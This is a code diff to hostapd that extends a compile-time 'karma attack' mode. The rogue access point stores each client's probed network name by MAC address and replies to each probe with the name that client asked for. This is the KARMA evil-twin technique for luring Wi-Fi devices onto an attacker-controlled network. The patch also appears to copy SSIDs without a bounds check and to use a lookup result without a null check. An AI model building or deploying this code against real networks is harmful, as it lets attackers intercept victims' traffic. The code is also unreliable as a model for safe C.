@@ -30,7 +30,10 @@
 #include "hs20.h"
 #include "dfs.h"
 #include "taxonomy.h"
-
+// include the required helper functions for karma attack
+#ifdef CONFIG_KARMA_ATTACK
+#include "karma_handlers.h"
+#endif
 
 #ifdef NEED_AP_MLME
 
@@ -370,6 +373,9 @@ static u8 * hostapd_gen_probe_resp(struct hostapd_data *hapd,
 	struct ieee80211_mgmt *resp;
 	u8 *pos, *epos, *csa_pos;
 	size_t buflen;
+#ifdef CONFIG_KARMA_ATTACK
+    struct hostapd_karma_data *karma_data;
+#endif
 
 #define MAX_PROBERESP_LEN 768
 	buflen = MAX_PROBERESP_LEN;
@@ -418,10 +424,11 @@ static u8 * hostapd_gen_probe_resp(struct hostapd_data *hapd,
 	*pos++ = WLAN_EID_SSID;
 #ifdef CONFIG_KARMA_ATTACK
     if (hapd->conf->karma_enable) {
-	    *pos++ = hapd->karma_data.ssid_len;
-	    os_memcpy(
-            pos, hapd->karma_data.ssid, hapd->karma_data.ssid_len);
-	    pos += hapd->karma_data.ssid_len;
+        karma_data = get_sta_karma_data(hapd, req->sa);
+        *pos++ = karma_data->ssid_len;
+        os_memcpy(
+            pos, karma_data->ssid, karma_data->ssid_len);
+        pos += karma_data->ssid_len;
     } else {
         *pos++ = hapd->conf->ssid.ssid_len;
         os_memcpy(
@@ -721,6 +728,9 @@ void handle_probe_req(struct hostapd_data *hapd,
 	int ret;
 	u16 csa_offs[2];
 	size_t csa_offs_len;
+#ifdef CONFIG_KARMA_ATTACK
+    struct hostapd_karma_data *karma_data;
+#endif
 
 	if (len < IEEE80211_HDRLEN)
 		return;
@@ -857,9 +867,16 @@ void handle_probe_req(struct hostapd_data *hapd,
     
 #ifdef CONFIG_KARMA_ATTACK
     if (hapd->conf->karma_enable) {
-	    os_memcpy(
-            hapd->karma_data.ssid, elems.ssid, elems.ssid_len);
-        hapd->karma_data.ssid_len = elems.ssid_len;
+        if ((karma_data=get_sta_karma_data(hapd, mgmt->sa))) {
+            // the mac address has been seen
+            os_memcpy(karma_data->ssid, elems.ssid, elems.ssid_len);
+            karma_data->ssid_len = elems.ssid_len; 
+        } else {
+            // haven't seen this station
+            karma_data = create_karma_data(elems.ssid, mgmt->sa,
+                elems.ssid_len);
+            add_sta_karma_data(hapd, karma_data);
+        }
     }
 #endif
 
